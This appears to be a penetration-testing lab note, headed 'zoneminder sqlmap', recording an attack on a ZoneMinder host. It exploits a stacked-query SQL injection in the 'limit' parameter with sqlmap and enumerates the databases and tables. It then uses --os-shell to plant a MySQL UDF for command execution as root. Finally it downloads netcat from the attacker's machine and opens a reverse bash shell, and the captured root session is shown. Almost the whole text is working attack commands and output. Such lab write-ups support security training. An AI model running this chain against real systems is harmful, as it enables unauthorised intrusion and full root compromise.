# 5 zoneminder sqlmap

```
# this is inferential sqli  - blind and time based
# using sqlmap

# modified post request as per exploit 
POST /zm/ HTTP/1.1
Host: 192.168.76.52
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Cookie: zmSkin=classic; zmCSS=classic; zmBandwidth=high; ZMSESSID=dfdnrq4j3o9sk33eu8ttonmfi6
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

view=request&request=log&task=query&limit=100&minTime=1466674406.084434

$ sqlmap -r log.txt -p limit --dbs --hex

web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
Parameter: limit (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=1466674406.084434
	
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_sc
[*] sys
[*] zm

# -D zm --tables
[17:29:21] [INFO] retrieved: Config
[17:30:43] [INFO] retrieved: ControlPresets
[17:33:42] [INFO] retrieved: Controls
[17:34:21] [INFO] retrieved: Devices
[17:35:47] [INFO] retrieved: Events
[17:37:12] [INFO] retrieved: Filters
[17:38:47] [INFO] retrieved: Frames
[17:39:51] [INFO] retrieved: Groups
[17:41:22] [INFO] retrieved: Logs
[17:42:25] [INFO] retrieved: MonitorPresets
[17:45:42] [INFO] retrieved: Monitors
[17:46:21] [INFO] retrieved: Servers
[17:47:53] [INFO] retrieved: States
[17:49:02] [INFO] retrieved: Stats
[17:49:31] [INFO] retrieved: TriggersX10
[17:51:49] [INFO] retrieved: Users

# this is taking too long
# calling --os-shell

$ sqlmap -r log.txt -p limit --dbms mysql --os-shell

[17:55:27] [INFO] fingerprinting the back-end DBMS operating system
[17:55:27] [INFO] the back-end DBMS operating system is Linux
[17:55:28] [INFO] testing if current user is DBA
[17:55:28] [INFO] fetching current user
[17:55:28] [INFO] retrieved: root@localhost

what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
[17:59:42] [INFO] checking if UDF 'sys_exec' already exist
[17:59:43] [INFO] checking if UDF 'sys_eval' already exist
[17:59:43] [INFO] detecting back-end DBMS version from its banner
[17:59:43] [INFO] retrieved: 5.7.30-0ubuntu0.16.04.1
[18:06:14] [INFO] retrieving MySQL plugin directory absolute path
[18:06:14] [INFO] retrieved: /usr/lib/mysql/plugin/
[18:12:37] [INFO] retrieved: 8040
[18:13:13] [INFO] the local file '/tmp/sqlmapbuoh0s27116457/lib_mysqludf_sysgi4itc4l.so' and the remote file '/usr/lib/mysql/plugin/libsuuxi.so' have the same size (8040 B)
[18:13:14] [INFO] creating UDF 'sys_exec' from the binary UDF file
[18:13:15] [INFO] creating UDF 'sys_eval' from the binary UDF file
[18:13:17] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[18:13:17] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[18:13:29] [INFO] retrieved: root
command standard output: 'root'
os-shell> wget 192.168.49.76/nc -O /tmp/nc && chmod 777 /tmp/nc && /tmp/nc -e /bin/bash 192.168.49.76 3305
do you want to retrieve the command standard output? [Y/n/a] n

$ nc -lvnp 3305
listening on [any] 3305 ...
connect to [192.168.49.76] from (UNKNOWN) [192.168.76.52] 56068
whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
pebbles
Linux pebbles 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
